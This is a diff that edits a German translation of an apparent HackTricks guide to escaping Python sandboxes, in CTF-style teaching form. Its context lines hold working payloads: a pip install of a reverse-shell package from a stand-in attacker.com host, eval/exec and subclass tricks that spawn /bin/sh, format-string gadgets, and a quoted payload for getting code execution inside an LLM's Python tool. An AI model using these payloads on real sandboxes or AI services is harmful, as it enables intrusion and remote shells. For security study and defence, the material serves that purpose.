@@ -2,7 +2,7 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Dies sind einige Tricks, um Python-Sandbox-Schutzmaßnahmen zu umgehen und beliebige Befehle auszuführen.
+Dies sind einige Tricks, um die Schutzmaßnahmen von Python-Sandboxes zu umgehen und beliebige Befehle auszuführen.
 
 ## Command Execution Libraries
 
@@ -41,8 +41,7 @@ system('ls')
 ```
 Denke daran, dass die _**open**_ und _**read**_ Funktionen nützlich sein können, um **Dateien** innerhalb der Python-Sandbox zu **lesen** und um **Code** zu **schreiben**, den du **ausführen** könntest, um die Sandbox zu **umgehen**.
 
-> [!CAUTION]
-> Die **Python2 input()** Funktion erlaubt das Ausführen von Python-Code, bevor das Programm abstürzt.
+> [!CAUTION] > Die **Python2 input()** Funktion erlaubt das Ausführen von Python-Code, bevor das Programm abstürzt.
 
 Python versucht, **Bibliotheken zuerst aus dem aktuellen Verzeichnis zu laden** (der folgende Befehl zeigt an, wo Python Module lädt): `python3 -c 'import sys; print(sys.path)'`
 
@@ -78,9 +77,11 @@ Wenn Sie Zugriff auf `pip` oder `pip.main()` haben, können Sie ein beliebiges P
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Sie können das Paket zum Erstellen der Reverse-Shell hier herunterladen. Bitte beachten Sie, dass Sie es **dekomprimieren, die `setup.py` ändern und Ihre IP für die Reverse-Shell eingeben** sollten:
+Sie können das Paket zum Erstellen der Reverse-Shell hier herunterladen. Bitte beachten Sie, dass Sie es **dekomprimieren, die `setup.py` ändern und Ihre IP für die Reverse-Shell einfügen** sollten:
 
-{% file src="../../../images/Reverse.tar (1).gz" %}
+{{#file}}
+Reverse.tar (1).gz
+{{#endfile}}
 
 > [!NOTE]
 > Dieses Paket heißt `Reverse`. Es wurde jedoch speziell erstellt, damit der Rest der Installation fehlschlägt, wenn Sie die Reverse-Shell verlassen, sodass Sie **keine zusätzlichen Python-Pakete auf dem Server installiert lassen**, wenn Sie gehen.
@@ -88,9 +89,9 @@ Sie können das Paket zum Erstellen der Reverse-Shell hier herunterladen. Bitte 
 ## Eval-ing python code
 
 > [!WARNING]
-> Beachten Sie, dass exec mehrzeilige Strings und ";" erlaubt, eval jedoch nicht (überprüfen Sie den Walross-Operator)
+> Beachten Sie, dass exec mehrzeilige Strings und ";" erlaubt, eval jedoch nicht (überprüfen Sie den Walross-Operator).
 
-Wenn bestimmte Zeichen verboten sind, können Sie die **hex/octal/B64**-Darstellung verwenden, um die Einschränkung zu **umgehen**:
+Wenn bestimmte Zeichen verboten sind, können Sie die **hex/octal/B64** Darstellung verwenden, um die Einschränkung zu **umgehen**:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -134,9 +135,9 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Bypassing protections through encodings (UTF-7)
+## Umgehung von Schutzmaßnahmen durch Kodierungen (UTF-7)
 
-In [**diesem Bericht**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) wird UFT-7 verwendet, um beliebigen Python-Code innerhalb einer scheinbaren Sandbox zu laden und auszuführen:
+In [**diesem Bericht**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) wird UTF-7 verwendet, um beliebigen Python-Code innerhalb einer scheinbaren Sandbox zu laden und auszuführen:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -404,7 +405,7 @@ class_obj.__init__.__globals__
 
 ## Entdeckung arbiträrer Ausführung
 
-Hier möchte ich erklären, wie man leicht **gefährlichere Funktionen** entdecken kann, die geladen werden, und zuverlässigere Exploits vorschlagen.
+Hier möchte ich erklären, wie man leicht **gefährlichere Funktionen** entdecken kann, die geladen sind, und zuverlässigere Exploits vorschlagen.
 
 #### Zugriff auf Unterklassen mit Bypässen
 
@@ -661,7 +662,7 @@ https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-
 
 ## Python Format String
 
-Wenn Sie eine **Zeichenkette** an Python **senden**, die **formatiert** werden soll, können Sie `{}` verwenden, um auf **interne Informationen von Python** zuzugreifen. Sie können die vorherigen Beispiele verwenden, um beispielsweise auf Globals oder Builtins zuzugreifen.
+Wenn Sie eine **Zeichenfolge** an Python **senden**, die **formatiert** werden soll, können Sie `{}` verwenden, um auf **interne Informationen von Python** zuzugreifen. Sie können die vorherigen Beispiele verwenden, um beispielsweise auf Globals oder Builtins zuzugreifen.
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -726,22 +727,22 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### LLM Jails bypass
+### LLM Jails umgehen
 
-From [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
+Von [hier](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
 ### Von Format zu RCE Bibliotheken laden
 
-Laut der [**TypeMonkey-Challenge aus diesem Bericht**](https://corgi.rip/posts/buckeye-writeups/) ist es möglich, beliebige Bibliotheken von der Festplatte zu laden, indem man die Format-String-Schwachstelle in Python ausnutzt.
+Laut der [**TypeMonkey Herausforderung aus diesem Bericht**](https://corgi.rip/posts/buckeye-writeups/) ist es möglich, beliebige Bibliotheken von der Festplatte zu laden, indem man die Format-String-Schwachstelle in Python ausnutzt.
 
 Zur Erinnerung: Jedes Mal, wenn eine Aktion in Python ausgeführt wird, wird eine Funktion aufgerufen. Zum Beispiel wird `2*3` **`(2).mul(3)`** ausführen oder **`{'a':'b'}['a']`** wird **`{'a':'b'}.__getitem__('a')`** sein.
 
 Es gibt mehr davon im Abschnitt [**Python-Ausführung ohne Aufrufe**](#python-execution-without-calls).
 
 Eine Python-Format-String-Schwachstelle erlaubt es nicht, Funktionen auszuführen (es erlaubt nicht die Verwendung von Klammern), daher ist es nicht möglich, RCE wie `'{0.system("/bin/sh")}'.format(os)` zu erhalten.\
-Es ist jedoch möglich, `[]` zu verwenden. Wenn also eine gängige Python-Bibliothek eine **`__getitem__`** oder **`__getattr__`** Methode hat, die beliebigen Code ausführt, ist es möglich, diese auszunutzen, um RCE zu erhalten.
+Es ist jedoch möglich, `[]` zu verwenden. Daher, wenn eine gängige Python-Bibliothek eine **`__getitem__`** oder **`__getattr__`** Methode hat, die beliebigen Code ausführt, ist es möglich, diese auszunutzen, um RCE zu erhalten.
 
-Auf der Suche nach einem solchen Gadget in Python schlägt der Bericht diese [**Github-Suchanfrage**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code) vor. Dort fand er dieses [eine](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
+Auf der Suche nach einem solchen Gadget in Python schlägt der Bericht diese [**Github-Suchanfrage**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code) vor. Wo er dieses [eine](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463) gefunden hat:
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -796,7 +797,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` und `func_globals` (Gleich) Erhält die globale Umgebung. Im Beispiel sehen Sie einige importierte Module, einige globale Variablen und deren deklarierten Inhalt:
+`__globals__` und `func_globals` (gleich) Erhält die globale Umgebung. Im Beispiel sehen Sie einige importierte Module, einige globale Variablen und deren deklarierten Inhalt:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -809,7 +810,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **Zugriff auf den Funktionscode**
 
-**`__code__`** und `func_code`: Sie können dieses **Attribut** der Funktion **zugreifen**, um das **Code-Objekt** der Funktion zu **erhalten**.
+**`__code__`** und `func_code`: Sie können **auf** dieses **Attribut** der Funktion **zugreifen**, um das **Code-Objekt** der Funktion **zu erhalten**.
 ```python
 # In our current example
 get_flag.__code__
@@ -921,7 +922,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Kompilieren von Python
 
-Jetzt stellen wir uns vor, dass Sie irgendwie **die Informationen über eine Funktion, die Sie nicht ausführen können, dumpen** können, aber Sie **müssen** sie **ausführen**.\
+Jetzt stellen wir uns vor, dass Sie irgendwie **die Informationen über eine Funktion dumpen können, die Sie nicht ausführen können**, aber Sie **müssen** sie **ausführen**.\
 Wie im folgenden Beispiel, Sie **können auf das Code-Objekt** dieser Funktion zugreifen, aber nur durch das Lesen der Disassemblierung **wissen Sie nicht, wie Sie das Flag berechnen** (_stellen Sie sich eine komplexere `calc_flag`-Funktion vor_)
 ```python
 def get_flag(some_input):
@@ -937,7 +938,7 @@ return "Nope"
 ```
 ### Erstellen des Code-Objekts
 
-Zuerst müssen wir wissen, **wie man ein Code-Objekt erstellt und ausführt**, damit wir eines erstellen können, um unsere Funktion auszuführen:
+Zuerst müssen wir wissen, **wie man ein Code-Objekt erstellt und ausführt**, damit wir eines erstellen können, um unsere Funktion auszuführen, die geleakt wurde:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -968,7 +969,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ### Rekreation einer geleakten Funktion
 
 > [!WARNING]
-> Im folgenden Beispiel werden wir alle Daten nehmen, die benötigt werden, um die Funktion direkt aus dem Funktionscodeobjekt zu rekreieren. In einem **realen Beispiel** sind alle **Werte**, um die Funktion **`code_type`** auszuführen, das, was **Sie leaken** müssen.
+> Im folgenden Beispiel werden wir alle Daten, die benötigt werden, um die Funktion direkt aus dem Funktionscodeobjekt zu rekreieren, entnehmen. In einem **realen Beispiel** sind alle **Werte**, um die Funktion **`code_type`** auszuführen, das, was **Sie leaken müssen**.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -981,10 +982,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-In den vorherigen Beispielen zu Beginn dieses Beitrags kannst du sehen, **wie man jeden Python-Code mit der `compile`-Funktion ausführt**. Das ist interessant, weil man **ganze Skripte** mit Schleifen und allem in einer **einzeiligen Anweisung** ausführen kann (und wir könnten dasselbe mit **`exec`** tun).\
+In den vorherigen Beispielen zu Beginn dieses Beitrags sehen Sie **wie man jeden Python-Code mit der `compile`-Funktion ausführt**. Das ist interessant, weil man **ganze Skripte** mit Schleifen und allem in einer **einzeiligen Anweisung** ausführen kann (und wir könnten dasselbe mit **`exec`** tun).\
 Wie auch immer, manchmal könnte es nützlich sein, ein **kompiliertes Objekt** auf einer lokalen Maschine zu **erstellen** und es auf der **CTF-Maschine** auszuführen (zum Beispiel, weil wir die `compiled`-Funktion in der CTF nicht haben).
 
-Zum Beispiel, lass uns manuell eine Funktion kompilieren und ausführen, die _./poc.py_ liest:
+Zum Beispiel, lassen Sie uns manuell eine Funktion kompilieren und ausführen, die _./poc.py_ liest:
 ```python
 #Locally
 def read():
@@ -1033,7 +1034,7 @@ Mit Tools wie [**https://www.decompiler.com/**](https://www.decompiler.com) kann
 
 ### Assert
 
-Python, das mit Optimierungen und dem Parameter `-O` ausgeführt wird, entfernt Assert-Anweisungen und jeglichen Code, der vom Wert von **debug** abhängt.\
+Python, das mit Optimierungen und dem Parameter `-O` ausgeführt wird, entfernt Assert-Anweisungen und jeden Code, der von dem Wert **debug** abhängt.\
 Daher sind Überprüfungen wie
 ```python
 def check_permission(super_user):
@@ -1053,6 +1054,5 @@ wird umgangen
 - [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
-
 
 {{#include ../../../banners/hacktricks-training.md}}
